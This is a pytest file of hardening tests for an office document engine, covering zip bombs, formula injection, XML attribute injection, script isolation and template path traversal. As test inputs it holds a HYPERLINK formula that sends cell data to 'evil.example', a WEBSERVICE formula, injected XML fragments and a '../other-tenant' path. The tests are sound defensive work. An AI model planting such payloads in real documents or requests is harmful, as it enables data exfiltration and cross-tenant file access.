"""Office engine and tool hardening: package guards, data never becomes a formula, isolated build scripts,
validated XML values, and template paths kept inside the workspace and the template stores."""

from __future__ import annotations

import io
import zipfile
from pathlib import Path

import pytest
from openpyxl import Workbook, load_workbook

from app.services.office.engine import api, package
from app.tools.context import ToolContext
from app.tools.office_impl._office_basic import CreateOfficeDocumentTool, FillOfficeTemplateTool
from app.tools.office_impl._office_generated_base import office_script_command, office_script_env
from app.tools.office_impl._office_word_scripts import BuildWordTemplateScriptTool
from tests.support.office_template_support import isolate_corp_identity_root, write_word_template


@pytest.fixture(autouse=True)
def _isolated_corp_identity_store(monkeypatch, tmp_path):
    isolate_corp_identity_root(monkeypatch, tmp_path / "store")


def _context(workspace: Path) -> ToolContext:
    return ToolContext(user_id="u", project_ids=[], roles=["admin"], session_id="s", project_config={}, db=None,
                       workspace_root=str(workspace))


# --- package guards (zip bombs, oversized files) ------------------------------------------------------------


def _package(path: Path, members: dict[str, bytes]) -> Path:
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as archive:
        for name, payload in members.items():
            archive.writestr(name, payload)
    return path


@pytest.mark.parametrize("case", ["ratio", "total", "members", "file_size"])
def test_bombs_and_oversized_packages_are_unreadable_before_parsing(tmp_path, monkeypatch, case):
    target = tmp_path / "bomb.docx"
    if case == "ratio":
        _package(target, {"[Content_Types].xml": b"<Types/>", "word/document.xml": b"\0" * (20 * 1024 * 1024)})
    elif case == "total":
        monkeypatch.setattr(package, "MAX_UNCOMPRESSED_BYTES", 1024)
        _package(target, {"[Content_Types].xml": b"<Types/>", "word/document.xml": bytes(range(256)) * 16})
    elif case == "members":
        monkeypatch.setattr(package, "MAX_MEMBERS", 10)
        _package(target, {f"part{index}.xml": b"<x/>" for index in range(11)})
    else:
        monkeypatch.setattr(package, "MAX_PACKAGE_BYTES", 10)
        _package(target, {"[Content_Types].xml": b"<Types/>"})

    result = api.view(target, "text")

    assert result["error_code"] == "office_document_unreadable", result


# --- data never becomes a formula -----------------------------------------------------------------------------


def test_template_data_and_cell_values_stay_data(tmp_path):
    template = tmp_path / "t.xlsx"
    workbook = Workbook()
    workbook.active["A1"] = "{{name}}"
    workbook.active["A2"] = "Customer: {{name}}"
    workbook.save(template)
    hostile = '=HYPERLINK("http://evil.example/?"&A3,"x")'

    assert api.merge(template, tmp_path / "out.xlsx", {"name": hostile})["success"]
    assert api.set_properties(tmp_path / "out.xlsx", "/Sheet/B1", {"value": "=WEBSERVICE(\"http://x\")"})["success"]
    assert api.set_properties(tmp_path / "out.xlsx", "/Sheet/C1", {"formula": "=1+1"})["success"]

    cells = load_workbook(tmp_path / "out.xlsx")["Sheet"]
    assert cells["A1"].value == hostile and cells["A1"].data_type == "s"
    assert cells["B1"].data_type == "s"
    assert cells["C1"].data_type == "f"  # the explicit formula property is the only way to a formula
    with zipfile.ZipFile(tmp_path / "out.xlsx") as archive:
        sheet = archive.read("xl/worksheets/sheet1.xml").decode()
    assert "<f>HYPERLINK" not in sheet and "<f>WEBSERVICE" not in sheet and "<f>1+1</f>" in sheet


# --- validated XML values ---------------------------------------------------------------------------------------


def test_line_ends_and_toc_levels_are_validated_before_xml(tmp_path):
    deck = tmp_path / "d.pptx"
    api.create(deck)
    slide = api.add(deck, "/", "slide", {"layout": "Blank"})["data"]["path"]
    bad_end = api.add(deck, slide, "connector", {"tailEnd": 'triangle"/><a:x y="'})
    good_end = api.add(deck, slide, "connector", {"tailEnd": "triangle"})
    report = tmp_path / "r.docx"
    api.create(report)
    bad_toc = api.add(report, "/body", "toc", {"levels": '1-3" \\h "x'})

    assert bad_end["error_code"] == "office_invalid_request" and good_end["success"]
    assert bad_toc["error_code"] == "office_invalid_request"


# --- isolated build scripts --------------------------------------------------------------------------------------


def test_build_scripts_run_isolated_with_a_scrubbed_environment(tmp_path, monkeypatch):
    monkeypatch.setenv("JWT_SECRET", "leak-me")
    script = tmp_path / "x.build.py"
    assert office_script_command(script)[1] == "-I"
    env = office_script_env(tmp_path)
    assert set(env) == {"PATH", "HOME", "LANG"} and "leak-me" not in env.values()


async def test_a_workspace_module_cannot_shadow_a_library(tmp_path):
    # A file named like the library next to the script would win without isolated mode.
    (tmp_path / "docx.py").write_text("raise SystemExit('shadowed library imported')\n", encoding="utf-8")
    (tmp_path / "json.py").write_text("raise SystemExit('shadowed stdlib imported')\n", encoding="utf-8")

    result = await BuildWordTemplateScriptTool().execute(
        {"file_path": "report.docx", "sections": [{"layout_type": "paragraph", "title": "Hello", "body": "World"}]},
        _context(tmp_path),
    )

    assert result.get("success") is True, result
    assert (tmp_path / "report.docx").is_file()


# --- template paths ------------------------------------------------------------------------------------------------


async def test_a_template_path_outside_the_workspace_and_stores_is_refused(tmp_path):
    workspace = tmp_path / "ws"
    workspace.mkdir()
    foreign = write_word_template(tmp_path / "other-tenant" / "secret.dotx")
    inside = write_word_template(workspace / "brand.dotx")

    refused_create = await CreateOfficeDocumentTool().execute(
        {"file_path": "a.docx", "template_path": str(foreign)}, _context(workspace)
    )
    refused_fill = await FillOfficeTemplateTool().execute(
        {"output_path": "b.docx", "template_path": "../other-tenant/secret.dotx", "data": {}}, _context(workspace)
    )
    refused_script = await BuildWordTemplateScriptTool().execute(
        {"file_path": "c.docx", "template_path": str(foreign), "sections": [{"layout_type": "paragraph"}]},
        _context(workspace),
    )
    allowed = await FillOfficeTemplateTool().execute(
        {"output_path": "d.docx", "template_path": str(inside), "data": {"title": "T"}}, _context(workspace)
    )

    for refused in (refused_create, refused_fill, refused_script):
        assert refused["error_code"] == "office_template_path_not_allowed", refused
    assert not (workspace / "a.docx").exists() and not (workspace / "b.docx").exists()
    assert allowed["success"] is True


def test_the_package_check_reads_only_the_directory(tmp_path):
    data = io.BytesIO()
    with zipfile.ZipFile(data, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("a.xml", b"<a/>")
    with zipfile.ZipFile(io.BytesIO(data.getvalue())) as archive:
        package.check_package(archive)  # a normal package passes
